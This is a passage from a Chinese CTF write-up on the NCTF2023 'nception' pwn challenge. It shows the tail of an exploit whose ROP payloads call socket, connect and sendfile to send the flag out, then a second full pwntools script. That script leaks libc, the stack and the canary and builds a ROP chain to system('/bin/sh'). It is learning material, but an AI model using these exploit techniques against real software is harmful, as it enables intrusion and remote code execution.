edit_func(2,payload1)

payload2=b&#39;a&#39;*0x30&#43;flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(sock_addr),
	modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
	modify(stderr_addr,0x111111),
    p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(16),
	modify(stdout_addr,libc.sym[&#39;connect&#39;] - libc.sym[&#39;socket&#39;]),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk4_addr-0x8&#43;0x30)	
])
edit_func(3,payload2)


payload3=b&#39;a&#39;*0x30&#43;flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stderr_addr, pop_rdx_rcx_rbx-0x111111-pop_rsi),
    modify(stderr_addr,0x111111),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	p64(0x50),
	p64(0),
	modify(stdout_addr,libc.sym[&#39;sendfile&#39;] -0x111111-libc.sym[&#39;connect&#39;]),
    modify(stdout_addr,0x111111),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
])
edit_func(4,payload3)



print(hex(len(payload)))
lg(&#34;heap_addr&#34;)
#mydbg()
pause()

edit(0,0x1f0,b&#34;a&#34;*0x220&#43;p64(heap_addr&#43;0x1100&#43;0x38)&#43;p64(0x0402395)&#43;b&#34;\n&#34;)
p.interactive()

```

#### 思路二

另一种解法，可见星盟安全团队的wp：https://blog.xmcve.com/2023/12/28/NCTF2023-Writeup/#title-13

在main函数的catch 中会先执行`___cxa_begin_catch`，该函数会指向对象的指针

![image-20240104212532070](assets/202401082251016.png)

![image-20240104213002056](assets/202401082251017.png)

该对象的前8字节指向libc c&#43;&#43; 中的vtable ，后8字节指向存储字符串的堆地址。

接下来会将rax赋值给rbp-0x18 的地址。

我们可以在edit 控制rbp，然后通过错误处理执行到这里，那么 利用该条语句可以实现任意地址写。

注意到程序中的结构如下`ptr-&gt;heap-&gt;content`

我们可以通过任意地址写将rax 写到 heap 中指向content的指针，那么通过show 就可以泄露libc地址。

&gt;  此时泄露完libc之后，可以像上面的解法一样，进行栈迁移后即可控制执行流程，且有了libc地址，可以直接利用pop rdi 这样的gadget了

另一方面，我们可以利用这个任意地址写将程序中的数据结构指针末位置0，实现错位构造，从而实现任意读写。

可以看到如果我们将ptr中存储的heap 指针末尾置0，并在其置0的位置布置好content指针，就可以实现任意地址读。

&gt; 也可以将heap 存储的content指针末尾置0，通过edit content 就可以控制相应heap 中的content 指针和size，如heap2 heap3 heap4 heap5 heap6等，实现任意读写。

这里选择将`0x13ca0e0`置0，即`0x13ca000`,这个地址正好是heap0 的content指针偏移0x130处。

![image-20240104214237746](assets/202401082251018.png)

![image-20240104214627963](assets/202401082251019.png)

因此我们需要事先在heap0 的content指针偏移0x130布置好要读取的地址，然后利用异常处理中的任意地址写将prt&#43;8处存储的heap 指针末位置0。

&gt; 需要注意，如果直接利用异常处理中的任意地址写将prt&#43;8处存储的heap1指针末位置0，它也会影响ptr 中存储的heap0指针。因此我们需要稍微设置一下堆布局，add7次之后，将heap1-到heap6释放，接着再把他们申请回来，由于tcache中的FILO机制，会使ptrs&#43;8-&gt;ptrs&#43;48 中的heap 指针逆序

![image-20240104215334455](assets/202401082251020.png)

这样错位写ptrs&#43;48 中的末尾地址仅仅会影响ptrs&#43;40，不会影响heap0指针。

![image-20240104221426505](assets/202401082251021.png) 

接下来就是先在heap0 的content指针偏移0x130处布置好got表，0x138 布置好长度，然后show(6)泄露libc

同样的方法利用environ泄露stack_addr ，并泄露canary，然后利用edit 的溢出构造好rop链即可getshell。

需要注意的使environ的地址末位为`&#34;\x20&#34;`,无法通过cin读入，那么我们就需要设置任意地址读environ&#43;1，

泄露stack 的高5位字节，然后爆破canary 的位置，最后泄露出canary （泄露出的canary 不一定正确，需要多次运行），最后就是溢出写rop getshell。

```python
from pwn import*
from ae64 import AE64
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
#p=remote(&#34;8.130.35.16&#34;,58000)
p=process(&#34;./nception&#34;)
libc=ELF(&#34;./libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *0x00402781\nb *0x0402E49\n b*0x0402E24&#34;)
	pause()


def menu(choice):
	ru(&#34;Now input your choice: &#34;)
	sl(str(choice))

def add():
	menu(1)

def edit(index,offset,content):
	menu(2)
	ru(&#34;To write object, input idx:&#34;)
	sl(str(index))
	ru(&#34;Now data offset:&#34;)
	sl(str(offset))
	ru(&#34;Now input your data:&#34;)
	s(content)

def show(idx):
	menu(3)
	ru(&#34;Which one do you want to read?&#34;)
	sl(str(idx))

def delete(idx):
	menu(4)
	ru(&#34;Which one do you want to destroy?&#34;)
	sl(str(idx))


add()
add()
add()
add()
add()
add()
add()
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
add()
add()
add()
add()
add()
add()
edit(0, 0x130, p64(0x405FC8)&#43;b&#34;\n&#34;)
edit(0, 0x130&#43;8, p32(0x444)&#43;b&#34;\n&#34;)

edit(0, 0, cyclic(544) &#43; p64(0x406429&#43;0x18)[:6]&#43;b&#34;\n&#34;)
show(6)
p.recvuntil(b&#39;Data: &#39;)
libc_base=uu64()-libc.sym[&#39;close&#39;]
lg(&#34;libc_base&#34;)

environ=libc_base&#43;libc.sym[&#39;_environ&#39;]

edit(0, 0x130, p64(environ&#43;1)&#43;b&#34;\n&#34;)
edit(0, 0x130&#43;8, p32(0x444)&#43;b&#34;\n&#34;)

show(6)
stack_base=uu64()
lg(&#34;stack_base&#34;)
canary_addr=stack_base-0x78
lg(&#34;canary_addr&#34;)
i=-10
while True:
    edit(0, 0x130, p64(canary_addr&#43;1&#43;i*8)&#43;b&#34;\n&#34;)
    i=i&#43;1
    edit(0, 0x130&#43;8, p32(0x444)&#43;b&#34;\n&#34;)
    show(6)
    ru(&#34;Data: &#34;)
    result=ru(&#34;\n&#34;)[:-1]
    if len(result)==8:
        break
canary=u64(result[:7].rjust(8,b&#34;\x00&#34;))
lg(&#34;canary&#34;)
#mydbg()
pop_rdi=0x0000000000027765&#43;libc_base
binsh=libc_base&#43;next(libc.search(b&#34;/bin/sh&#34;))
sys_addr=libc_base&#43;libc.sym[&#39;system&#39;]
ret_addr=0x00000000000270e2 &#43;libc_base
payload=b&#39;\x00&#39;*0x208&#43;p64(canary)*3&#43;p64(0)&#43;p64(ret_addr)&#43;p64(pop_rdi)&#43;p64(binsh)&#43;p64(sys_addr)&#43;b&#34;\n&#34;
edit(0,0,payload)
p.interactive()
```

#### 待做

**Spirit战队**wp中采用了反弹shell 的做法，这里我还不太了解，后续再学习吧。https://mp.weixin.qq.com/s/PtM7i5bPU2I7h3wZ328JQQ 

---

> 作者: chuwei  
> URL: http://localhost:1313/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/  

